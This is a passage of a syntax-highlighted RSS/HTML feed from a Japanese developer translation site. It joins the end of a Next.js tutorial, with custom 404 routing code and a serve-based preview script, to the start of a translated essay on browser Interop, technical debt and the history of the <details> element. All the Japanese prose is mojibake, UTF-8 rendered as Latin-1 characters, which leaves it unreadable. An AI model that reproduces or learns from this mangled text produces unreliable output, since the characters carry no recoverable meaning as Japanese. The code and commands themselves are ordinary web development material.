  <span class="token keyword">return</span> <span class="token function">pathMatchesPage</span><span class="token punctuation">(</span>pathname<span class="token punctuation">,</span> pages<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">pathMatchesPage</span><span class="token punctuation">(</span>pathname<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> pages<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> cleanPathname <span class="token operator">=</span> <span class="token function">removeTrailingSlash</span><span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>pages<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>cleanPathname<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">const</span> page <span class="token operator">=</span> pages<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">isDynamicRoute</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">getRouteRegex</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">.</span>re<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>cleanPathname<span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * If both asPath and pathname are equal then it means that we
 * are on the correct route it still doesnt exist
 */</span>
<span class="token keyword">function</span> <span class="token function">doesNeedsProcessing</span><span class="token punctuation">(</span>router<span class="token operator">:</span> NextRouter<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> status <span class="token operator">=</span> router<span class="token punctuation">.</span>pathname <span class="token operator">!==</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>
  <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Does Needs Processing"</span><span class="token punctuation">,</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">,</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> status<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">Custom404</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token punctuation">[</span>isNotFound<span class="token punctuation">,</span> setIsNotFound<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">processLocationAndRedirect</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>router<span class="token operator">:</span> NextRouter<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">doesNeedsProcessing</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> targetIsValidPage <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getDoesLocationMatchPage</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>asPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>targetIsValidPage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>asPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">setIsNotFound</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>router<span class="token punctuation">.</span>isReady<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">processLocationAndRedirect</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// eslint-disable-next-line react-hooks/exhaustive-deps</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>router<span class="token punctuation">.</span>isReady<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isNotFound<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fixed inset-0 flex justify-center items-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex flex-col gap-10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Custom 404 - Page Not Found</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
          </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">Go to Home Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Custom404<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ãƒ«ãƒ¼ãƒˆã§ãƒšãƒ¼ã‚¸ãŒè¦‹ã¤ã‹ã‚‰ãªã„ã‚¨ãƒ©ãƒ¼ã‚’è§£æ±ºã™ã‚‹ãŸã‚ã«ã€<code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«<code class="language-text">404.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å…¥ã‚Œã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
ã¾ãŸã€ãƒ“ãƒ«ãƒ‰ä½œæˆå¾Œã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€<code class="language-text">package.json</code>ãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’è¿½åŠ ã—ã¦ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="json"><pre style="counter-reset: linenumber NaN" class="language-json line-numbers"><code class="language-json"><span class="token property">"preview"</span><span class="token operator">:</span> <span class="token string">"serve out/ -p 3000"</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>serveãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãŒãªã„å ´åˆã¯ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="shell"><pre style="counter-reset: linenumber NaN" class="language-shell line-numbers"><code class="language-shell"><span class="token function">npm</span> i <span class="token parameter variable">-D</span> serve</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><code class="language-text">npm run build</code>ã¨<code class="language-text">npm run preview</code>ã‚’å®Ÿè¡Œã—ãŸå¾Œã€ãƒãƒ¼ãƒˆ3000ã§ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
ã‚³ãƒ¼ãƒ‰å…¨ä½“ã¯<a href="https://github.com/ikramdeveloper/i18n-nextjs-output-export">GitHub</a>ã«ã‚ã‚Šã¾ã™ã€‚ä¸€éƒ¨å¾®èª¿æ•´ã‚’åŠ ãˆã¦ã„ã¾ã™ã®ã§ã€ã‚ˆã‚ã—ã‘ã‚Œã°ã”è¦§ãã ã•ã„ã€‚
ä½•ã‹ãŠæ°—ã¥ãã®ç‚¹ã‚„ã‚¨ãƒ©ãƒ¼ãªã©ãŒã‚ã‚Œã°ãœã²ã‚³ãƒ¡ãƒ³ãƒˆã‚’ãã ã•ã„ã€‚å–œã‚“ã§ã‚µãƒãƒ¼ãƒˆã„ãŸã—ã¾ã™ã€‚ã‚ˆã‚ã—ããŠé¡˜ã„ã—ã¾ã™ï¼</p>]]></content:encoded></item><item><title><![CDATA[Interopã¨é›£è§£ãªå•é¡Œ]]></title><description><![CDATA[Webãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ãŠã‘ã‚‹å„ªå…ˆäº‹é …ã€æŠ€è¡“çš„è² å‚µã€é›£è§£ãªå•é¡Œã«ã¤ã„ã¦è©±ã—ã¾ã—ã‚‡ã†... ãƒ–ãƒ©ã‚¦ã‚¶ã‚¨ãƒ³ã‚¸ãƒ³ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¯ã€ä»–ã®ã»ã¨ã‚“ã©ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨å¤šãã®ç‚¹ã§ä¼¼ã¦ã„ã¾ã™ã€‚ã€Œç®¡ç†è€…ã€ã¯ä»Šâ€¦]]></description><link>https://postd.cc/Interop-and-hard-problems/</link><guid isPermaLink="false">https://postd.cc/Interop-and-hard-problems/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[Interop]]></category><pubDate>Fri, 21 Feb 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><em>Webãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ãŠã‘ã‚‹å„ªå…ˆäº‹é …ã€æŠ€è¡“çš„è² å‚µã€é›£è§£ãªå•é¡Œã«ã¤ã„ã¦è©±ã—ã¾ã—ã‚‡ã†...</em></p>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã‚¨ãƒ³ã‚¸ãƒ³ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¯ã€ä»–ã®ã»ã¨ã‚“ã©ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨å¤šãã®ç‚¹ã§ä¼¼ã¦ã„ã¾ã™ã€‚ã€Œç®¡ç†è€…ã€ã¯ä»Šã‚‚ã€ä¼‘è·ä¸­ã®ãƒ¡ãƒ³ãƒãƒ¼ãªã©ã‚’è€ƒæ…®ã«å…¥ã‚ŒãªãŒã‚‰ã€ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ãŒçµ±æ‹¬ã™ã‚‹å°‚é–€ãƒãƒ¼ãƒ ã‚’ç·¨æˆã—ã€äºˆç®—ã‚’å‰²ã‚Šå½“ã¦ã¾ã™ã€‚å„ªå…ˆäº‹é …ã‚’æ±ºã‚ã€ç¶¿å¯†ãªè¨ˆç”»ã‚’ç«‹ã¦ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã—ã¦ç­†è€…ãŒã“ã‚Œã¾ã§è¦‹ã¦ããŸã©ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨ã‚‚å…±é€šã™ã‚‹ç‚¹ã¨ã—ã¦ã€åŒã˜ã‚ˆã†ãªãƒ—ãƒ¬ãƒƒã‚·ãƒ£ãƒ¼ã‚„å•é¡Œã«ç›´é¢ã—ã¾ã™ã€‚å…¨ã¦ã®ä½œæ¥­ã«ååˆ†ãªãƒªã‚½ãƒ¼ã‚¹ãŒç¢ºä¿ã§ãã‚‹ã“ã¨ã¯ãªãã€å¸¸ã«ä½•ã‹ã—ã‚‰æ–°ãŸãªè¦æ±‚ãŒè¿½åŠ ã•ã‚Œã€æŠ€è¡“çš„è² å‚µãŒç©ã¿ä¸ŠãŒã‚Šã€æ™‚æŠ˜æœ¬å½“ã«é›£è§£ãªå•é¡ŒãŒç™ºç”Ÿã—ã¾ã™ã€‚
ãƒ–ãƒ©ã‚¦ã‚¶ã‚¨ãƒ³ã‚¸ãƒ³ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ç‰¹æ®Šãªç‚¹ãŒã‚ã‚‹ã¨ã™ã‚Œã°ã€ç‹¬ç«‹ã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒ ä»¥ä¸Šã®ã‚‚ã®ã«ãªã‚ã†ã¨ã—ã¦ã„ã‚‹ã“ã¨ã§ã—ã‚‡ã†ã€‚ç›¸äº’é‹ç”¨å¯èƒ½ãªæ¨™æº–ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«è²¢çŒ®ã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹ã®ã§ã™ã€‚ç§ãŸã¡ã«ã¨ã£ã¦å•é¡Œãªã®ã¯ã€ãƒãƒ¼ãƒ ç‹¬è‡ªã®å„ªå…ˆäº‹é …ã‚’ã€Œå…¨ã¦ã€ã‚¯ãƒªã‚¢ã—ã€ä¸€èˆ¬å‘ã‘ã«ãƒªãƒªãƒ¼ã‚¹ã•ã‚Œã‚‹ãªã©ã—ã¦ã€åˆã‚ã¦ãã®æ©æµãŒå¾—ã‚‰ã‚Œã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ã“ã‚Œã¯å®Ÿéš›ã«çµŒé¨“ã™ã‚‹ã¨ã¤ã‚‰ã„ã‚‚ã®ã§ã™ã€‚
<code class="language-text">&lt;details></code>è¦ç´ ã‚’ä¾‹ã«è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚ã“ã‚Œã¯æ–‡å­—é€šã‚Šæœ€ã‚‚å˜ç´”ãªã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–è¦ç´ ã§ã™ã€‚ã“ã‚Œã¾ã§ã®çµŒç·¯ã‚’ä»¥ä¸‹ã«æ•´ç†ã—ã¾ã™ã€‚</p>
<ul>
<li>2011å¹´6æœˆã«ChromeãŒ<code class="language-text">&lt;details></code>ã‚’å°å…¥</li>
<li>1å¹´å¾Œã®2012å¹´7æœˆã«SafariãŒå°å…¥</li>
<li>ãã®1å¹´å¾Œã®2013å¹´7æœˆã«OperaãŒå°å…¥</li>
<li>ãã®3å¹´å¾Œã®2016å¹´9æœˆã«FirefoxãŒå°å…¥</li>
<li>Microsoftã¯å°å…¥ã›ãšã€2020å¹´ã«EdgeãŒChromiumç‰ˆã«ç§»è¡Œã—ã¦ã‚ˆã†ã‚„ãå°å…¥</li>
</ul>
<p>ãƒªãƒªãƒ¼ã‚¹ã‹ã‚‰å…¨ã¦ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«å°å…¥ã•ã‚Œã‚‹ã¾ã§9å¹´ã‚‚ã‹ã‹ã‚Šã¾ã—ãŸã€‚æ–°ãŸã«å®šç¾©ã•ã‚ŒãŸã€ãƒ–ãƒ©ã‚¦ã‚¶æ™®åŠç‡ãŒ100%ã«é™ã‚Šãªãè¿‘ã„çŠ¶æ…‹ã«ãªã£ãŸã“ã¨ã‚’ç¤ºã™ã€Œ<a href="https://web.dev/baseline">Baseline: Widely Available</a>ã€ã®æ¡ä»¶ã‚’æº€ãŸã™ã®ã«ã•ã‚‰ã«3å¹´ã‹ã‹ã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€å®Ÿè³ªçš„ã«ã¯æ˜¨å¹´ã‚ˆã†ã‚„ãWidely Availableã¨ãªã£ãŸã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ã—ã‹ã‚‚ã€ã“ã‚Œã¯ã¾ã åˆæœŸæ®µéšã§ã‚ã‚Šã€ã‹ã¤é­…åŠ›çš„ãªéƒ¨åˆ†ã«ã™ãã¾ã›ã‚“ã€‚å½“ç„¶ã€ã“ã‚Œã‹ã‚‰ãƒã‚°ãŒè¦‹ã¤ã‹ã£ã¦ã€æ–°ãŸãªãƒ†ã‚¹ãƒˆãŒè¿½åŠ ã•ã‚Œã€æœ€çµ‚çš„ã«ã¯æ”¹è‰¯ç‰ˆã‚„ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ãªã©ãŒãƒªãƒªãƒ¼ã‚¹ã•ã‚Œã¾ã™ã€‚ç¾åœ¨ã‚‚ã€ãƒšãƒ¼ã‚¸å†…æ¤œç´¢ãªã©ã‚’æ”¹å–„ã—ãŸã‚Šã€å‘¼ã³å‡ºã—å…ƒãªã©ã®æ–°ã—ã„æ¦‚å¿µã‚’è¿½åŠ ã—ãŸã‚Šã™ã‚‹ãŸã³ã«ã€ãƒ†ã‚¹ãƒˆãŒå¤±æ•—ã™ã‚‹å ´åˆãŒã‚ã‚Šã€<code class="language-text">&lt;details></code>ã®ã‚µãƒãƒ¼ãƒˆçŠ¶æ³ã‚’ã°ã‚‰ã°ã‚‰ãªã‚‚ã®ã«ã—ã¦ã„ã¾ã™ã€‚</p>
<p>æ™‚é–“ã¨ã¨ã‚‚ã«ã€æ©Ÿèƒ½ãƒãƒˆãƒªã‚¯ã‚¹ã®é …ç›®ã¯å¢—ãˆç¶šã‘ã€è¦ä»¶ã‚’ã‚¯ãƒªã‚¢ã™ã‚‹ã‚ˆã‚Šã‚‚é€Ÿã„ãƒšãƒ¼ã‚¹ã§æœªå¯¾å¿œäº‹é …ãŒå¢—ãˆã¦ã„ã¾ã™ã€‚æŠ€è¡“çš„è² å‚µã¯ç©ã¿ä¸ŠãŒã‚‹ä¸€æ–¹ã§ã™ã€‚</p>
<h2>Interopã®ç™»å ´</h2>
<p>Interopã¯å½“åˆã€æŠ€è¡“çš„è² å‚µã‚’æ¸›ã‚‰ã™ãŸã‚ã®æ‰‹æ®µã¨ã—ã¦è€ƒæ¡ˆã•ã‚Œã¾ã—ãŸã€‚å„ªå…ˆäº‹é …ã‚’å”åŠ›ã—ã¦é¸ã³ã€ä¸åˆæ ¼ã‚’ç¤ºã™èµ¤ã„å››è§’ã‚’å…¨éƒ¨ç·‘è‰²ã«å¤‰ãˆã¦ã„ãå–ã‚Šçµ„ã¿ã§ã™ã€‚ã—ã‹ã—ã€å„ªå…ˆäº‹é …ã®åˆ¤æ–­ã¯é›£ã—ã„å•é¡Œã§ã™ã€‚</p>
<p>ç§ãŸã¡ã¯æ¯å¹´ãŠãŠã‚ˆã100ä»¶ç¨‹åº¦ã®è¦ä»¶ã‚’å„ªå…ˆäº‹é …ã¨ã—ã¦æŒ‡å®šã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€Interopã¯å˜ã«ãƒ–ãƒ©ã‚¦ã‚¶ãƒ¡ãƒ¼ã‚«ãƒ¼ãŒåŒã˜å„ªå…ˆäº‹é …ã«åˆæ„ã™ã‚‹æ‰‹åŠ©ã‘ã‚’ã—ã¦ã„ã‚‹ã«ã™ãã¾ã›ã‚“ã€‚ãƒªã‚½ãƒ¼ã‚¹è‡ªä½“ãŒæœ‰é™ãªã®ã¯å¤‰ã‚ã‚Šã¾ã›ã‚“ã€‚ã¤ã¾ã‚Šã€ä½•ã‹ã‚’å„ªå…ˆã™ã‚‹ã¨ã„ã†ã“ã¨ã¯ã€å¿…ç„¶çš„ã«ä»–ã®ã‚‚ã®ã¯å„ªå…ˆã—ãªã„ã¨ã„ã†ã“ã¨ã«ãªã‚Šã¾ã™ã€‚</p>
<p>ã¾ãŸã€ä½•ã‚’å„ªå…ˆã™ã‚‹ã‹ã€ãªãœå„ªå…ˆã™ã¹ãã‹ã«ã¤ã„ã¦ã€å¤šãã®ç«¶åˆåœ§åŠ›ã‚’å„æ–¹é¢ã‹ã‚‰å—ã‘ã¾ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€åˆæœŸé–‹ç™ºã«å…±åŒã§é›†ä¸­çš„ã«å–ã‚Šçµ„ã‚€ã“ã¨ãŒã§ãã‚Œã°ã€ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã«ã¨ã£ã¦ã¯æ¥µã‚ã¦åŠ¹ç‡çš„ã§ã™ã€ã¨ã„ã£ãŸã“ã¨ã‚’è¨€ã‚ã‚Œã‚‹ã‚ã‘ã§ã™ã€‚2011å¹´ã€ã‚ã‚‹ã„ã¯2012å¹´ã«<code class="language-text">&lt;details></code>ã‚’æ¥µã‚ã¦é«˜ã„å“è³ªã§å…¨ã¦ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«å®Ÿè£…ã§ãã¦ã„ãŸã‚‰ã©ã†ã ã£ãŸã‹ã€æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€‚</p>
<p>ã„ãã¤ã‹ã®æ–°æ©Ÿèƒ½ã«å…±åŒã§å–ã‚Šçµ„ã‚€åˆ©ç‚¹ã¯ä»–ã«ã‚‚ã‚ã‚Šã¾ã™ã€‚ã¾ãšã€é–‹ç™ºã«æºã‚ã‚‹äººã€…ã®ç†±æ„ãŒé•ã„ã¾ã™ã€‚ã¾ãŸã€èª°ã‚‚ãŒåŒã˜ãƒ†ãƒ¼ãƒã«ã¤ã„ã¦åŒæ™‚ã«è©±ã™ã‚ˆã†ã«ãªã‚‹ãŸã‚ã€èª°ã‚‚å¤§ããªã‚¤ãƒ™ãƒ³ãƒˆã‚’è¦‹é€ƒã™ã“ã¨ãŒãªããªã‚Šã¾ã™ã€‚ãã®çµæœã€æ™®åŠã‚‚æ—©ã¾ã‚Šã¾ã™ã€‚ECMAã®å¹´æ¬¡ç‰ˆã®ã‚ˆã†ãªã‚‚ã®ã‚‚å¾—ã‚‰ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€<a href="https://wpt.fyi/interop-2024">æ˜¨å¹´Interop</a>ãŒCSSãƒã‚¹ãƒ†ã‚£ãƒ³ã‚°ã€ãƒãƒƒãƒ—ã‚ªãƒ¼ãƒãƒ¼ã€ç›¸å¯¾ã‚«ãƒ©ãƒ¼æ§‹æ–‡ã€å®£è¨€å‹Shadow DOMãªã©ã®é ˜åŸŸã‚’è¿½åŠ ã—ãŸã®ã¯æ„å¤–ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>ã—ã‹ã—ãã®ä¸€æ–¹ã§ã€ã™ã§ã«ã‚µãƒãƒ¼ãƒˆçŠ¶æ³ãŒã°ã‚‰ã°ã‚‰ãªæ©Ÿèƒ½ã‚‚å¤šãã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯å„ªå…ˆé †ä½ã‚’åˆ¤æ–­ã™ã‚‹ã®ãŒæ¥µã‚ã¦é›£ã—ãã€ã„ãŸã‚‹ã¨ã“ã‚ã«è¦‹ã‚‰ã‚Œã¾ã™ã€‚å½“ç„¶ãã‚Œãã‚Œä¾¡å€¤ãŒç•°ãªã‚Šã€ãã®ä¾¡å€¤ã«ã¤ã„ã¦ã‚‚è­°è«–ã®ä½™åœ°ãŒã‚ã‚Šã¾ã™ã€‚å¯¾è±¡ã¨ãªã‚‹ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãŒå…¨ãç•°ãªã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚ã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦ã‹ã‹ã‚‹ã‚³ã‚¹ãƒˆãŒé•ã†å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚
ã“ã†ã—ãŸçŠ¶æ³ãŒé‡ãªã‚‹ã“ã¨ã§ã€å¸¸ã«é›£è§£ãªå•é¡ŒãŒã¤ãã¾ã¨ã„ã¾ã™ã€‚ãƒ‹ãƒ¼ã‚ºã¨ã—ã¦ã„ã¤ã¾ã§ã‚‚ã€æ™‚ã«æ¥µã‚ã¦é•·ã„æœŸé–“æ®‹ã‚Šç¶šã‘ã¾ã™ã€‚</p>
<h2>é•·æœŸé–“ã«ã‚ãŸã‚‹é›£è§£ãªå•é¡Œ</h2>
<p>ã“ã†ã—ãŸé•·æœŸé–“ã«ã‚ãŸã‚‹é›£è§£ãªå•é¡Œã«ã¤ã„ã¦ã¯ã€ã©ã†ã„ã†ã‚ã‘ã‹ä¸€å‘ã«å„ªå…ˆé †ä½ãŒæ±ºã¾ã‚Šã¾ã›ã‚“ãŒã€ç­†è€…ã¯ä»Šå¹´ã€ã“ã‚Œã‚‰ã®å•é¡Œã‚’å„ªå…ˆé †ä½ä»˜ã‘ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ãªã‘ã‚Œã°ãªã‚‰ãªã„ã¨ä¸»å¼µã—ãŸã„ã¨æ€ã„ã¾ã™ã€‚5å¹´ã€7å¹´ã€ã‚ã‚‹ã„ã¯10å¹´ã”ã¨ã«ã€ã“ã†ã—ãŸãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«é›†ä¸­ã—ã¦å–ã‚Šçµ„ã‚€å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p>
